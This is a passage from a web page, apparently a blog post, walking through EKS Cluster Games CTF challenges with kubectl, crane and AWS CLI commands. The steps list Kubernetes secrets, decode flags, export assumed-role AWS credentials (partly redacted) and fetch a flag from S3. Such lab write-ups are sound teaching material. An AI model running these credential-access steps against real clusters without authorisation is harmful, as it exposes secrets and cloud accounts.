<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"AccessKeyId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNEV&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"SecretAccessKey"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"VTZ4TuDrtHGca&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"SessionToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"Expiration"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03T05:09:07+00:00"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"SubjectFromWebIdentityToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"system:serviceaccount:challenge5:debug-sa",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"AssumedRoleUser"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"AssumedRoleId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"AROA2AVYNEVMZEZ2AFVYI:test",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Provider"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Audience"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"sts.amazonaws.com"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_ACCESS_KEY_ID="ASIA2AVYNEV&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"UserId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"AROA2AVYNEVMZEZ2AFVYI:test",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Account"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>We are now the new role!   We hopefully have access to S3 now.  At the start
of the challenge it provided us a clue to what bucket we want to view by
providing us the IAM policy:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="json" data-theme="default"><code data-language="json" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">"Policy"</span><span style="color: #ADBAC7">: {</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"Statement"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">            {</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Action"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"s3:GetObject"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"s3:ListBucket"</span></span>
<span data-line=""><span style="color: #ADBAC7">                ],</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Effect"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"Allow"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #8DDB8C">"Resource"</span><span style="color: #ADBAC7">: [</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"</span></span>
<span data-line=""><span style="color: #ADBAC7">                ]</span></span>
<span data-line=""><span style="color: #ADBAC7">            }</span></span>
<span data-line=""><span style="color: #ADBAC7">        ],</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"Version"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"2012-10-17"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cp</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">.</span></span>
<span data-line=""><span style="color: #F69D50">download:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">./flag</span><span style="color: #ADBAC7">       </span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">flag</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}</span></span></code></pre></div>
<p>and thats the final flag! In my next post I'll discuss the remediation steps
to prevent this configuration mistakes on your cluster!</p></div></article></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":["2023","eks_cluster_games_ctf"],"path":"2023/eks_cluster_games_ctf","contentHtml":"\u003cp\u003e\u003ca href=\"https://eksclustergames.com\"\u003eeksclustergames.com\u003c/a\u003e is a new CTF targetted at\nkubernetes vulnerabilities. This is a walk through on how to solve the issues.\u003c/p\u003e\n\u003ch1\u003eChallenge 1\u003c/h1\u003e\n\u003cp\u003eThe first challenge starts off with a clue:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eJumpstart your quest by listing all the secrets in the cluster.\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eCan you spot the flag among them?\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo lets start off by getting the secrets:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eNAME\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e         \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eTYPE\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eDATA\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAGE\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003elog-rotate\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eOpaque\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e1\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e37\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eh\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince there is only one, lets view it!\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"v1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"items\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"v1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"data\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"flag\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"Secret\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"metadata\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"creationTimestamp\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:02:08Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"name\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"log-rotate\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"namespace\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"challenge1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"resourceVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"890951\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"uid\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"03f6372c-b728-4c5b-ad28-70d5af8d387c\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"type\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"Opaque\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"List\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"metadata\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"resourceVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe flag seems to be in \u003ccode\u003e.items[0].data.flag\u003c/code\u003e and is \u003ccode\u003ebase64\u003c/code\u003e encoded so we can\ndecode it as well:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.items[0].data.flag'\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-r\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ebase64\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-d\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewiz_eks_challenge\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{omg_over_privileged_*REDACTED*}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFirst flag found!\u003c/p\u003e\n\u003cp\u003eThis one was definitely a softball but it gets you nice and warmed up on the\nplatform.\u003c/p\u003e\n\u003ch1\u003eChallenge 2\u003c/h1\u003e\n\u003cp\u003eThe hint for this challenge is:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eA thing we learned during our research: always check the container registries.\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eFor your convenience, the crane utility is already pre-installed on the machine.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe first thing I think of when reading this is that it has something to do\nwith the registry a pod is living on.   So lets list the pods and see what is\navailable:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eNAME\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eREADY\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eSTATUS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eRESTARTS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAGE\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003edatabase-pod-2c9b3a4e\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e1\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/1\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eRunning\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e0\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e          \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e36\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eh\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith only one pod as a target, lets get the image for it:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.items[0].spec.containers[0].image'\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e\"eksclustergames/base_ext_image\"\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo its on standard \u003ccode\u003edocker.io\u003c/code\u003e registry instead of a private one like I was\nexpecting from the clue.   The second hint was that crane is on the system so\nlets use that to pull the image and inspect it:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" 